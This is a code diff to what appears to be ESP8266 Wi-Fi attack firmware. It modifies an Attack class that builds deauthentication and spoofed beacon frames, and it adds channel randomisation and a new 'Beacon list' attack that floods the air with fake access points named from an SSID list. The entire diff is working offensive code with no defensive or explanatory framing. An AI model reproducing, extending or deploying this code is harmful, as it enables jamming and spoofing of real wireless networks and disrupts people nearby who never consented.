@@ -10,7 +10,8 @@ void Attack::generate(){
   Mac _randomBeaconMac;
   uint8_t _randomMacBuffer[6];
   beaconAdrs._clear();
-  
+
+  for(int i=0;i<macListLen;i++) channels[i] = random(1,12);
   do{
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
@@ -37,7 +38,7 @@ void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason){
   packet[24] = reason;
 }
 
-void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encrypt){
+void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt){
   packetSize = 0;
   int ssidLen = _ssid.length();
   if(ssidLen>32) ssidLen = 32;
@@ -48,9 +49,6 @@ void Attack::buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encry
   }
 
   for(int i=0;i<6;i++){
-    //set target (client)
-    //packet[4+i] = _client._get(i);
-    packet[4+i] = _client._get(i);
     //set source (AP)
     packet[10+i] = packet[16+i] = _ap._get(i);
   }
@@ -150,7 +148,7 @@ void Attack::run(){
     }
   }
 
-  /* =============== Beacon Attack =============== */
+  /* =============== Beacon clone Attack =============== */
   if(isRunning[1] && currentMillis-prevTime[1] >= 100){
     if(debug) Serial.print("running "+(String)attackNames[1]+" attack");
     prevTime[1] = millis();
@@ -160,15 +158,13 @@ void Attack::run(){
         String _ssid = apScan.getAPName(a);
         int _ssidLen = _ssid.length();
         int _restSSIDLen = 32 - _ssidLen;
-        int _ch = apScan.getAPChannel(a);
-
-        Mac _broadcast;
-        _broadcast.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
+        //int _ch = apScan.getAPChannel(a);
 
         //wifi_set_channel(_ch);
 
         for(int c=0;c<macListLen/apScan.selectedSum;c++){
           String _apName = _ssid;
+          int _ch = channels[c];
               
           if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP   "
           else if(c < _restSSIDLen*2){
@@ -182,7 +178,7 @@ void Attack::run(){
             _apName += (String)c;//e.g. "SAMPLEAP        78"
           }
 
-          buildBeacon(beaconAdrs._get(c),_broadcast,_apName,_ch,apScan.getAPEncryption(a) != "none");
+          buildBeacon(beaconAdrs._get(c),_apName,_ch,apScan.getAPEncryption(a) != "none");
 
           if(send()) packetsCounter[1]++;
         }
@@ -203,6 +199,34 @@ void Attack::run(){
       if(attackTimeoutCounter[1]/10 > settings.attackTimeout) stop(1);
     }
   }
+
+  /* =============== Beacon list Attack =============== */
+  if(isRunning[2] && currentMillis-prevTime[2] >= 100){
+    if(debug) Serial.print("running "+(String)attackNames[2]+" attack");
+    prevTime[2] = millis();
+    
+    for(int a=0;a<ssidList.len;a++){
+      String _ssid = ssidList.get(a);
+      int _ch = channels[a];
+
+      buildBeacon(beaconAdrs._get(a),_ssid,_ch,settings.attackEncrypted);
+
+      if(send()) packetsCounter[2]++;
+    }
+    
+    stati[2] = (String)(packetsCounter[2]*10)+"pkts/s";
+    packetsCounter[2] = 0;
+    macListChangeCounter++;
+    if(macListChangeCounter/10 >= macChangeInterval){
+      generate();
+      macListChangeCounter = 0;
+    }
+    if(debug) Serial.println("done");
+    if(settings.attackTimeout > 0){
+      attackTimeoutCounter[2]++;
+      if(attackTimeoutCounter[2]/10 > settings.attackTimeout) stop(2);
+    }
+  }
   
 }
 
@@ -213,8 +237,9 @@ void Attack::start(int num){
     prevTime[num] = millis();
     attackTimeoutCounter[num] = 0;
     if(debug) Serial.println("starting "+(String)attackNames[num]+" attack");
+    if(num == 1 && isRunning[2]) stop(2);
+    else if(num == 2 && isRunning[1]) stop(1);
   }else stop(num);
-  
 }
 
 void Attack::stop(int num){
@@ -232,13 +257,11 @@ void Attack::stopAll(){
 
 String Attack::getResults(){
   if(debug) Serial.print("getting attacks JSON...");
-  
+
+  for(int i=0;i<attacksNum;i++) if(!isRunning[i]) stati[i] = "ready";
+    
   if(apScan.getFirstTarget() < 0) stati[0] = stati[1] = "no AP";
-  else {
-    for(int i=0;i<attacksNum;i++){
-      if(!isRunning[i]) stati[i] = "ready";
-    }
-  }
+  if(ssidList.len < 1) stati[2] = "no SSID";
 
   int _selected;
   String json = "{ \"aps\": [";
